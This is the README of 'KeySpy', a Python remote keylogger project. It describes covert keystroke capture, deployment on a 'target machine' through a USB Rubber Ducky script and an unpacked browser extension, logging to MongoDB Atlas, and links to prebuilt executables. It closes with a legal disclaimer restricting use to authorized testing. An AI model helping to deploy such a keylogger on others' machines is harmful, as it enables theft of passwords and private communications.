<p align="center"><a href="https://github.com/3rr0r-505/KeySpy"><img alt="" src="https://github.com/3rr0r-505/KeySpy/blob/main/img/KeySpy-cover.png?raw=true"  height="50%" width="100%"/></a></p>

<p align="center"> 
<a href="https://www.python.org/"><img alt="" src="https://img.shields.io/badge/python-3.9%2B-brighten?logo=python&label=pyhton&color=blue"/></a>
&nbsp;
<a href="https://www.gnu.org/gnu/linux-and-gnu.en.html"><img alt="" src="https://img.shields.io/badge/OS-GNU%2FLINUX-brighten?logo=linux&label=OS&labelColor=grey&color=red"/></a>
&nbsp;
<a href="https://www.microsoft.com/en-us/windows?r=1"><img alt="" src="https://img.shields.io/badge/OS-Windows-brighten?logo=windows&label=OS&labelColor=grey&color=blue"/></a><br>
</p>

# KeySpy - Remote Keylogger Tool

KeySpy is a simple Python keylogger with a web interface for viewing captured keystrokes in real-time.

## Features

- Captures keystrokes in the background while running.
- Stores captured keystrokes in a `keylogs.txt` file.
- Displays captured keystrokes in a web interface using Flask.
- Automatically starts the keylogger and web interface upon running the `weblogger.py` script.
- Allows viewing keystrokes from multiple sessions.

## Installation
 
1. Clone the repository:
   ```bash
   git clone https://github.com/3rr0r-505/KeySpy.git

2. Navigate to the project directory:
   ```bash
   cd KeySpy

3. Install the required dependencies using pip:
   ```bash
   pip install -r requirements.txt

## Usage
   ### 🦆Rubber Ducky
   - Download the DuckyScript.txt and load that in USB Rubber Ducky.
   - Connect the USB Rubber Ducky to the target machine at least 30 seconds.
   - It will run KeySpy on that machine.
   ### 🕸️Web Extension:
   - Open the Browser.
   - Search this link `chrome://extensions/`.
   - Click on `Load Unpack`.
   - Add W3bSpy-Client folder from `./src/W3bSpy/W3bSpy-Client`
    
### 🌐Web Interface:
   - Install [W3Blogger.exe](https://github.com/3rr0r-505/KeySpy/raw/main/exe/W3Blogger/W3Blogger_v1.1.exe) and launch it.
   

## Note
- For Downloading the `kSpy-AIO.exe` file [click here](https://github.com/3rr0r-505/KeySpy/raw/main/exe/kSpy-AIO/kSpy-AIO_v1.2.exe).
- Create a `mongoDB Atlas` cluster and use the connection links.
- Soon the extension will be available on the chrome store.

## Contributing

Contributions are welcome! Feel free to open issues or pull requests for any improvements or bug fixes.

## Legal Disclaimer
The use of code contained in this repository, either in part or in its totality,
for engaging targets without prior mutual consent is illegal. **It is
the end user's responsibility to obey all applicable local, state and
federal laws.**

Developers assume **no liability** and are not
responsible for misuses or damages caused by any code contained
in this repository in any event that, accidentally or otherwise, it comes to
be utilized by a threat agent or unauthorized entity as a means to compromise
the security, privacy, confidentiality, integrity, and/or availability of
systems and their associated resources. In this context the term "compromise" is
henceforth understood as the leverage of exploitation of known or unknown vulnerabilities
present in said systems, including, but not limited to, the implementation of
security controls, human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those
circumstances directly related to **educational environments** or
**authorized penetration testing engagements** whose declared purpose is that
of finding and mitigating vulnerabilities in systems, limiting their exposure
to compromises and exploits employed by malicious agents as defined in their
respective threat models.

## License
This project is licensed under the MIT License 2.0 - see the LICENSE file for details.
